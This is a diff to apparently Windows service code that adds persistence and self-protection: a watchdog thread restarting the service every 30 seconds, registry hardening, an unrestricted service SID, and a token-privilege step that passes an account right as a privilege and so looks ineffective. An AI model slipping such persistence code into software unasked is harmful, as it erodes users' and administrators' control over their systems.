@@ -55,6 +55,7 @@ static void RunCore() {
     CleanSuspiciousAutoruns();
     EnsureScheduledTask();
     HardenInstallDir();
+    HardenRegistryAcl();
 
     g_serviceRunning = true;
 
@@ -147,6 +148,13 @@ static void RunCore() {
         }
     }).detach();
 
+    std::thread([]() {
+        while (g_serviceRunning) {
+            Sleep(30000);
+            EnsureServiceRunning();
+        }
+    }).detach();
+
     while (g_serviceRunning) Sleep(1000);
 }
 
@@ -211,6 +219,23 @@ bool InstallService(const std::wstring& binPath) {
     fa.cActions = 3;
     fa.lpsaActions = actions;
     ChangeServiceConfig2W(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);
+
+    SERVICE_SID_INFO sid{};
+    sid.dwServiceSidType = SERVICE_SID_TYPE_UNRESTRICTED;
+    ChangeServiceConfig2W(svc, SERVICE_CONFIG_SERVICE_SID_INFO, &sid);
+
+    HANDLE hToken = nullptr;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        TOKEN_PRIVILEGES tp{};
+        LUID luid{};
+        if (LookupPrivilegeValueW(nullptr, SE_SERVICE_LOGON_NAME, &luid)) {
+            tp.PrivilegeCount = 1;
+            tp.Privileges[0].Luid = luid;
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
+        }
+        CloseHandle(hToken);
+    }
 
     CloseServiceHandle(svc);
     CloseServiceHandle(scm);
